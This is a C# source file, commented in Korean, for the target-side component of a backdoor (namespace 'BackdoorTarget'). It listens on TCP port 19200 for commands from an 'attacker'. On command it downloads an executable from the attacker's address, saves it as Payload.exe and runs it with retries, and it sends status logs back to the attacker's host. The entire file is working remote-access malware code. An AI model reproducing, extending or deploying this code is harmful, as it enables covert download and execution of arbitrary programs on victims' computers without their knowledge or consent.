using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BackdoorTarget
{
    public class Network
    {
        /// <summary>
        /// 공격자가 보내는 신호 플래그
        /// </summary>
        public enum SignalFlags 
        {
            Check = 0, Start, Abort, Exit 
        }
        /// <summary>
        /// 이 프로그램이 보낼 자신의 상태 플래그
        /// </summary>
        public enum StatusFlags 
        {
            Idle = 0, Listening, Waiting ,Executing
        };
        StatusFlags StatusFlag = new StatusFlags();

        Socket Listener;

        bool UseRandomPort = false;
        IPAddress RemoteIp;
        IPEndPoint RemoteEP;
        IPEndPoint LogSenderEP;

        IPEndPoint LocalEp = null;

        /// <summary>
        /// 네트워크 관련 변수를 초기화함
        /// </summary>
        public Network()
        {
            StatusFlag = StatusFlags.Idle;
        }
        /// <summary>
        /// 네트워크 코드 진입점
        /// </summary>
        public void NetMain()
        {
            while (StatusFlag == StatusFlags.Idle)
            {
                Wait();
            }
        }

        
        /// <summary>
        /// 공격자로부터 연결이 들어올때까지 기다림
        /// </summary>
        public void Wait()
        {
            Listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            foreach(IPAddress Addr in Dns.GetHostAddresses(Dns.GetHostName()))
            {
                if (Addr.AddressFamily == AddressFamily.InterNetwork)
                {
                    LocalEp = new IPEndPoint(Addr,19200);
                    break;
                }
            }

            Console.WriteLine(LocalEp.Address);
            Listener.Bind(LocalEp);
            Listener.Listen(5);
            StatusFlag = StatusFlags.Listening;
            ThreadStart Ts = new ThreadStart(GetConnection);
            Thread thread = new Thread(Ts);
            thread.Start();
        }

        /// <summary>
        /// 공격자로부터 들어오는 신호에 따라 동작을 취함
        /// </summary>
        public void GetConnection()
        {
            while(true)
            {
                Socket AccSock = Listener.Accept();
                byte[] Flag = new byte[1];
                AccSock.Receive(Flag);
                byte[] Respond = new byte[8];
                if (Flag[0] == (int)SignalFlags.Check)
                {
                    AccSock.Send(BitConverter.GetBytes((int)StatusFlag));
                }
                else if (Flag[0] == (int)SignalFlags.Start)
                {
                    byte[] Addrs = new byte[4];
                    AccSock.Receive(Addrs);
                    RemoteIp = new IPAddress(Addrs);
                    if(UseRandomPort)
                    {
                        IPGlobalProperties Properties = IPGlobalProperties.GetIPGlobalProperties();
                        TcpConnectionInformation[] AvailableEP = Properties.GetActiveTcpConnections();
                        Console.WriteLine(RemoteIp);
                        List<int> UsedPorts = AvailableEP.Select(p => p.LocalEndPoint.Port).ToList();
                        foreach (int AvailablePort in UsedPorts)
                        {
                            if (!UsedPorts.Contains(AvailablePort))
                            {
                                Console.WriteLine(AvailablePort);
                                LocalEp = new IPEndPoint(LocalEp.Address, AvailablePort);
                                AccSock.Send(BitConverter.GetBytes(AvailablePort));
                                LogSender("Available Port: " + AvailablePort);
                                break;
                            }
                        }
                    }
                    LogSenderEP = new IPEndPoint(RemoteIp, LocalEp.Port - 1);
                    StatusFlag = StatusFlags.Executing;
                    AccSock.Send(BitConverter.GetBytes((int)StatusFlag));
                    GetPayload();
                }
            }
        }

        /// <summary>
        /// 공격자에게로 로그를 전송함
        /// </summary>
        /// <param name="LogMsg">보낼 로그 메시지</param>
        public void LogSender(string LogMsg)
        {
            try
            {
                Socket LogSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);   //로그 전송용 소켓
                LogSock.Connect(LogSenderEP.Address, LogSenderEP.Port);
                byte[] Msg = new byte[1];

                Msg = Encoding.UTF8.GetBytes(LogMsg);

                LogSock.Send(BitConverter.GetBytes(Msg.Length));
                LogSock.Send(Msg);
            }
            catch(Exception Ex)
            {
                Console.WriteLine(Ex.StackTrace);
            }
        }

        /// <summary>
        /// 공격자에게서 공격용 프로그램을 받음
        /// </summary>
        public void GetPayload()
        {
            TcpListener Listener = new TcpListener(LocalEp.Address,LocalEp.Port + 1);
            Listener.Start(3);
            while(true)
            {
                if(Listener.Pending())
                {
                    break;
                }
            }
            using (var Client = Listener.AcceptTcpClient())
            using (var Stream = Client.GetStream())
            using (var Output = File.Create(Application.StartupPath + @"\Payload.exe"))
            {
                var buffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = Stream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    Output.Write(buffer, 0, bytesRead);
                    Console.WriteLine(bytesRead);
                }
                Console.WriteLine("파일 받기 끝");
                LogSender("파일 전송 끝");
            }
            Execute execute = new Execute(Application.StartupPath + @"\Payload.exe",RemoteIp);
            for(int i = 1; i <= 5; i++)
            {
                if(execute.StartPayload())
                {
                    Console.WriteLine("페이로드 준비됨");
                    LogSender("페이로드 준비됨");
                    break;
                }
                else
                {
                    Console.WriteLine("페이로드 준비 실패" + i + "번째 시도");
                    LogSender("페이로드 준비 실패" + i + "번째 시도");
                }
            }
        }
    }
}
